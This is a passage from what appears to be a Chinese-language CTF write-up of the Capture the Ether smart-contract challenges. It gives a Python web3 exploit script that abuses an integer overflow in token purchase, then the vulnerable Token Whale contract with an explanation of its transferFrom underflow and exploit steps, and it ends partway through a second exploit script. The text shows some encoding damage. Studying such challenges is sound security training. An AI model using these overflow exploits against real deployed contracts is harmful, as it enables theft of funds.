class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> timeout</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0x0e27e17Ab06db38134825299a2bA0A3749Ea810c&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;buy&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;sell&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key)</span><br><span class="line"></span><br><span class="line">min_token_number_with_overflow = <span class="number">2</span> ** <span class="number">256</span> // <span class="number">10</span> ** <span class="number">18</span> + <span class="number">1</span></span><br><span class="line">value = (min_token_number_with_overflow * <span class="number">10</span> ** <span class="number">18</span>) % <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[*] Buying ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">tx = contract.functions.buy(min_token_number_with_overflow).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> : value,</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;[+] Bought!&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*] Selling ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tx = contract.functions.sell(<span class="number">1</span>).buildTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    signed = acct.signTransaction(tx)</span><br><span class="line">    tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line">    <span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&quot;[+] Sold!&quot;</span>)</span><br><span class="line">        print(contract.functions.isComplete().call())</span><br><span class="line">        print(<span class="string">&#x27;[+] Solved&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-Token-whale"><a href="#2-Token-whale" class="headerlink" title="2. Token whale"></a>2. Token whale</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This ERC20-compatible token is hard to acquire. Thereâ€™s a fixed supply of 1,000 tokens, all of which are yours to start with.</p><p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">        totalSupply &#x3D; 1000;</span><br><span class="line">        balanceOf[player] &#x3D; 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;&#x3D; 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=cvcA8truev4">Tough Decisions</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>åˆå§‹è´¦æˆ·æœ‰ 1000 ä¸ªtokenï¼Œ é¢˜ç›®è¦æ±‚æˆ‘ä»¬è·å–åˆ° 1000000 token ã€‚ ä¸»è¦äº¤æ˜“å‡½æ•°æœ‰ä¸¤ä¸ª: <code>transfer</code>  ä»¥åŠ<code>transferFrom</code> , è¿™ä¸¤ä¸ªå‡½æ•°æœ€åéƒ½è°ƒç”¨äº† <code>_transfer</code>  ã€‚é€šè¿‡ç®€å•å®¡è®¡æˆ‘ä»¬å‘ç°ï¼Œ <code>_transfer</code>  ä¸­çš„ <code>balanceOf[msg.sender] -= value;</code>  æ˜¯å­˜åœ¨æº¢å‡ºçš„ ã€‚ å¦å¤–æˆ‘ä»¬æ³¨æ„åˆ° <code>transferFrom</code> è¿›è¡Œäº†å¤§å°æ£€ï¼Œ ä½†æ˜¯æ£€æŸ¥çš„æ˜¯ <code>balanceOf[from] &gt;= value</code> , ä½†å®é™…æ‰£æ¬¾çš„æ˜¯  msg.sender , å› æ­¤æ­¤å¤„å­˜åœ¨æ¼æ´é£é™©ã€‚</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>å‡†å¤‡éœ€è¦ä¸¤ä¸ªè´¦æˆ· ï¼ˆé€šè¿‡ metamask æ–°å»ºä¸€ä¸ªè´¦æˆ·å³å¯ ï¼‰</li><li>é€šè¿‡ <code>transfer</code>  å‘æ–°å»ºçš„è´¦æˆ·è½¬ balanceï¼Œ å¤šè½¬ç‚¹ï¼Œ è®©æ–°è´¦æˆ·çš„ balance å¤šäºä¸»è´¦æˆ·çš„å³å¯</li><li>è°ƒç”¨ <code>approve</code>  è®¾ç½® <code>allowance</code> ,  <code>spender</code> ä¸ºä¸»è´¦æˆ·ï¼Œ<code>value</code> ä¸ºå¤§äºåé¢è¦è½¬çš„å€¼å³å¯ ï¼Œä¾‹å¦‚è®¾ç½®ä¸º 1000</li><li>æœ€åè°ƒç”¨ <code>transferFrom</code> å‡½æ•° <code>from</code>  è®¾ç½®ä¸ºè´¦å· 2ï¼Œ <code>to</code>  è®¾ç½®ä¸ºéä¸»è´¦æˆ·å³å¯ï¼Œ è½¬å…¥ä¸€ä¸ªå€¼è®©å…¶æº¢å‡ºå³å¯ã€‚ </li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0xDC57892A1058d1e54c9364Ba726BB7643bdA6b2C&quot;</span></span><br><span class="line"></span><br><span class="line">MasterWalt = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">MasterPrivKey  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">HelpWalt = <span class="string">&quot;0x0cC33CD693bf9BF609e1B7C0E88E34Ff972Afe6f&quot;</span></span><br><span class="line">HelpPrivKey = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;name&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;approve&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;totalSupply&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;transferFrom&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;decimals&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint8&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;symbol&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span 